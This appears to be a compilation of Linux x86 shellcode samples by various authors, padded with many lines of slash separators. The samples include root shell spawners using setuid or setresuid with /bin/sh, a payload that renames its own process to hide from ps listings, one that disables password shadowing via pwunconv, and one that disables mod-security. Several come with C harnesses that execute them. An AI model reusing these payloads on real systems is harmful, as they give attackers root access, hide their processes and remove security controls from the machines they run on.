////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

     /*-----------------------------------------------------*/
     /*     Alpha-Numeric Shellcode using IMUL Method       */
     /*           By XORt@dallas_2600)              88bytes */
     /*-----------------------------------------------------*/
     "\x68\x69\x58\x69\x6b" /* push $0x6b695869             */
     "\x68\x7a\x36\x37\x70" /* push $0x7037367a             */
     "\x68\x58\x58\x41\x73" /* push $0x73415858             */
     "\x68\x71\x4a\x77\x79" /* push $0x79774a71             */
     "\x68\x65\x77\x57\x31" /* push $0x31577765             */
     "\x68\x42\x69\x57\x77" /* push $0x6850c031             */
     "\x50\x50\x50\x50\x50" /* 17 push %eax's               */
     "\x50\x50\x50\x50\x50" /*                              */
     "\x50\x50\x50\x50\x50" /*                              */
     "\x50\x50"             /*                              */
     "\x54"                 /* push %esp                    */
     "\x59"                 /* pop %ecx                     */
     "\x6b\x51\x58\x57"     /* imul $0x57, 0x58(%ecx), %edx */
     "\x42"                 /* inc %edx                     */
     "\x52"                 /* push %edx                    */
     "\x6b\x41\x54\x78"     /* imul $0x78, 0x54(%ecx), %edx */
     "\x34\x63"             /* xor $0x63, %al               */
     "\x50"                 /* push %eax                    */
     "\x6b\x51\x50\x4a"     /* imul $0x4a, 0x50(%ecx), %edx */
     "\x4a"                 /* dec %edx                     */
     "\x4a"                 /* dec %edx                     */
     "\x52"                 /* push %edx                    */
     "\x6b\x51\x4c\x79"     /* imul $0x79, 0x4c(%ecx), %edx */
     "\x4a"                 /* dec %edx                     */
     "\x52"                 /* push %edx                    */
     "\x6b\x41\x48\x36"     /* imul $0x36, 0x48(%ecx), %edx */
     "\x34\x61"             /* xor $0x61, %al               */
     "\x50"                 /* push %eax                    */
     "\x6b\x51\x44\x79"     /* imul $0x79, 0x44(%ecx), %edx */
     "\x4a"                 /* dec %edx                     */
     "\x52"                 /* push %edx                    */
     /*------------------------------------------[bytes:88]-*/






////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*----------------------------------------------------------------------------*
 *          [Mystique Project: Examples of long-term payloads]                *
 *                       hide-wait-change code                                *
 *                 by xort@tty64.org  &  izik@tty64.org                       *
 *----------------------------------------------------------------------------*
 * This code, upon execution, will perform the following things...            *
 *                                                                            *
 *   1) Fork a new process, and kill PPID via _exit() so we get inherrited    *
 *      by init and now have a new PID.                                       *
 *   2) Will obtain the current location of argv[0] by retrieving information *
 *      from /proc/self/stat.                                                 *
 *   3) Copy the name we wish to masquarade as into argv[0] in memory.        *
 *   4) Call setsid() to establish ourselfs as a process leader.              *
 *   5) Will sleep via nanosleep() for a givin interval of time.              *
 *   6) Will check to see if a file exist via access().                       *
 *   7) If it does not Loop back to step 5                                    *
 *   8) If it does then we chmod() the file with permissions 0455.            *
 *   9) Calls _exit()                                                         *
 *                                                                            *
 *  * steps 3-4 effectivly hide us from most ps-listings                      *
 *                                                                            *
 *   size: 187 + strlen(new-proc-name) + strlen(file-to-change)               *
 *----------------------------------------------------------------------------*/
	
char shellcode[]=
"\x6a\x02\x58\xcd\x80\x85\xc0\x74\x79\x31\xc0\x40\xcd\x80\x5b\x8d"
"\x73\x10\xfe\x43\x0f\x99\x31\xc9\xb0\x05\xcd\x80\x93\x6a\x03\x58"
"\xb2\xfa\x89\xe1\x29\xd1\xcd\x80\x89\xcf\x01\xc7\x93\xfd\x6a\x20"
"\x58\x6a\x0e\x59\x87\xcb\xf2\xae\x87\xcb\xe2\xf8\x47\x47\x31\xc0"
"\x6a\x0a\x5b\xfc\x31\xd2\x8a\x0f\x83\xe9\x30\x01\xc8\x47\x80\x3f"
"\x20\x74\x04\xf7\xe3\xeb\xed\x94\x5f\x5f\x94\x57\xb1\xff\x31\xc0"
"\xf3\xaa\x5f\x56\x4e\x46\x41\x80\x3e\xff\x75\xf9\xfe\x06\x5e\xf3"
"\xa4\xb0\x42\xcd\x80\x89\xf7\x92\x48\x89\xc1\xf2\xae\xfe\x47\xff"
"\xff\xe7\xe8\x87\xff\xff\xff"
"/proc/self/stat\xff"                       // 
"xort and izik rocks the linux box\xff"     // new proc name
"/tmp/foo\xff"                              // file to chmod
"\x6a"                                      //
"\x03"                                      // sleep-time
"\x40\x89\xe1\x89\xe3\x34\xa2\xcd\x80\x31\xc9\x89\xf3\x34\x21\xcd"
"\x80\x85\xc0\x75\xeb\xb0\x0f\x66\xb9\x6d\x09\xcd\x80\x40\xcd\x80";





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

const char sc[]= "\x31\xdb" //xor ebx,ebx
                 "\x8d\x43\x17" //LEA eax,[ebx + 0x17] /LEA is FASTER tha push/pop
                 "\x99" //cdq
                 "\xcd\x80" //int 80 //setuid(0) shouldn't returns -1 right? ;)
                 "\xb0\x0b" //mov al,0bh
                 "\x52" //push edx /Termina la cadena //bin/sh con un 0
                 "\x68\x6e\x2f\x73\x68"
                 "\x68\x2f\x2f\x62\x69"
                 "\x89\xe3" //mov ebx,esp
                 "\x89\xd1" //mov ecx,edx
                 "\xcd\x80"; //int 80h

int main()
{
  printf("\nSMALLEST SETUID & EXECVE GNU/LINUX x86 STABLE SHELLCODE "
        "WITHOUT NULLS THAT SPAWNS A SHELL"
                        "\n\nCoded by vlan7"
                        "\n\t + vlan7[at]bigfoot.com"
                        "\n\t + http://vlan7.blogspot.com"
                        "\n\n[+] Date: 4/Jul/2009"
                        "\n[+] Thanks to: sch3m4. He initiated the funny game."
                        "\n\n[+] Shellcode Size: %d bytes\n\n",
                        sizeof(sc)-1);
        (*(void (*)()) sc)();
        return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

const char sc[]= "\x31\xdb" //xor ebx,ebx
                 "\x8d\x43\x17" //LEA eax,[ebx + 0x17] /LEA is FASTER than push and pop!
                 "\x99" //cdq
                 "\xcd\x80" //int 80 //setuid(0) shouldn't returns -1 right? ;)
                 "\xb0\x0b" //mov al,0bh
                 "\x52" //push edx /Termina la cadena con un 0
                 "\x68\x63\x6f\x6e\x76" //push dword "conv"
                 "\x68\x70\x77\x75\x6e" //push dword "pwun"
                 "\x68\x62\x69\x6e\x2f" //push dword "bin/"
                 "\x68\x73\x72\x2f\x73" //push dword "sr/s"
                 "\x68\x2f\x2f\x2f\x75" //push dword "///u"
                 "\x89\xe3" //mov ebx,esp
                 "\x89\xd1" //mov ecx,edx
                 "\xcd\x80"; //int 80h

void main()
{
  printf("\n~ This shellcode disables shadowing on a linux system ~"
         "\n\n\t ~ Coded by vlan7 ~"
         "\n\t ~ http://vlan7.blogspot.com ~"
         "\n\n ~ Date: 4/Jul/2009"

         "\n\tYou'll have the passwords stored in /etc/passwd."
		 "\n\tFor undo purposes use the pwconv command."
         "\n\t ~ Cheers go to: Wadalbertia"
         "\n\t ~ Shellcode Size: %d bytes\n\n",
                sizeof(sc)-1);

        (*(void (*)()) sc)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


unsigned char scode[] =
"\x29\xc9\x83\xe9\xe9\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xfd"
"\x96\x34\xe4\x83\xeb\xfc\xe2\xf4\xcc\x5f\xbd\x2f\x97\xd0\x6c\x29"
"\x7d\xfc\x31\xbc\xcc\x5f\x65\x8c\x8e\xe5\x43\x80\x95\xb9\x1b\x94"
"\x9c\xfe\x1b\x81\x89\xf5\xbd\x07\xbc\x23\x30\x29\x7d\x05\xdc\xc6"
"\xfd\x96\x34\x90\xcd\xa6\x46\xde\xbc\xd7\x6d\xaf\xaa\xc0\x5e\xb6"
"\xb1\xa0\x5e\x8f\xb4\xac\x04\xde\xcd\xac\x0e\xcb\xc7\xb9\x56\x8d"
"\x93\xb9\x47\x8c\xf7\xcf\xbf\xb5\x01\xfc\x30\xbc\x30\x16\x5e\xe5"
"\xa5\x5b\xb4\xe4";




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

{==========================================================}
{ linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes    }
{==========================================================}

Shellcode by the FHM crew:
----------------------------
http://fhm.noblogs.org
----------------------------

Contact us at:

--------------------------------------------------
sorrow: rawhazard@autistici.org; betat@hotmail.it
--------------------------------------------------
fhm: fhm@autistici.org;
--------------------------------------------------


Assembly code:

--[code]--
BITS 32

;setresuid(0,0,0)
xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq
mov BYTE al, 0xa4
int 0x80

;execve("/bin//sh", ["/bin//sh", NULL], [NULL])
push BYTE 11
pop eax
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ecx
mov edx, esp
push ebx
mov ecx, esp
int 0x80
--[/code]--

Shellcode string:
--[code]--
char shellcode [] =
"\x80\xcd\xe1\x89\x53\xe2\x89\x51\xe3\x89\x6e\x69\x62\x2f\x68\x68\x73\x2f\x2f
                    
\x68\x51\x58\x0b\x6a\x80\xcd\xa4\xb0\x99\xc9\x31\xdb\x31\xc0\x31"
-[/code]-




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* sloth@nopninjas.com - http://www.nopninjas.com

   Platform: Linux x86
   Length: 50 bytes
     
   - This shellcode connects to the shared memory segment matching the key
     and executes the code at that address. 

        xorl    %edi,%edi
        xorl    %esi,%esi
        xorl    %edx,%edx
        movl    $0xdeadbeef,%ecx       * shared memory key *
        xorl    %ebx,%ebx
        movb    $23,%bl
        xorl    %eax,%eax
        movb    $117,%al
        int     $0x80

        xorl    %edi,%edi
        movl    $0xbffffffa,%esi       * pointer storage location *
        xorl    %edx,%edx
        movl    %eax,%ecx
        xorl    %ebx,%ebx
        movb    $21,%bl
        xorl    %eax,%eax
        movb    $117,%al
        int     $0x80

        movl    $0xbffffffa,%eax       * pointer storage location *
        pushl   (%eax)
        ret

*/

char shm[] = "\x31\xff\x31\xf6\x31\xd2\xb9\xef\xbe\xad\xde\x31\xdb\xb3\x17\x31"
             "\xc0\xb0\x75\xcd\x80\x31\xff\xbe\xfa\xff\xff\xbf\x31\xd2\x89\xc1"
             "\x31\xdb\xb3\x15\x31\xc0\xb0\x75\xcd\x80\xb8\xfa\xff\xff\xbf\xff"
             "\x30\xc3";
              
int main() {
  void (*shell)() = (void *)&shm;
  shell();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* sekfault@shellcode.com.ar - Goodfellas Security Research Team - 2010
 * /usr/sbin/a2dismod mod-security2 - disable modsecurity
 * 64 bytes
 *__asm__(
 *                "xor %eax,%eax \n"
 *                 "push %eax \n"
 *                 "cdq \n"
 *                 "push $0x646f6d73 \n"
 *                 "push $0x69643261 \n"
 *                 "push $0x2f6e6962 \n"
 *                 "push $0x732f7273 \n"
 *                 "push $0x752f2f2f \n"
 *                 "mov %esp,%ebx \n"
 *                 "push $0x32 \n"
 *                 "push $0x79746972 \n"
 *                 "push $0x75636573 \n"
 *                 "push $0x2d646f6d \n"
 *                 "mov %esp,%ecx \n"
 *                 "xor %edx,%edx \n"
 *                 "mov $0xb,%al \n"
 *                 "push %edx \n"
 *                 "push %ecx \n"
 *                 "push %ebx \n"
 *                 "mov %esp,%ecx \n"
 *                 "mov %esp,%edx \n"
 *                 "int $0x80 \n"
                   );
 */
char shellcode[]="\x31\xc0\x50\x99\x68\x73\x6d\x6f\x64\x68\x61\x32\x64\x69\x68\x62\x69\x6e\x2f\x68\x73\x72\x2f\x73\x68\x2f\x2f\x2f\x75\x89\xe3\x6a\x32\x68\x72\x69\x74\x79\x68\x73\x65\x63\x75\x68\x6d\x6f\x64\x2d\x89\xe1\x31\xd2\xb0\x0b\x52\x51\x53\x89\xe1\x89\xe2\xcd\x80";
 
int main()
{
        (*(void(*)())shellcode)();
        return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



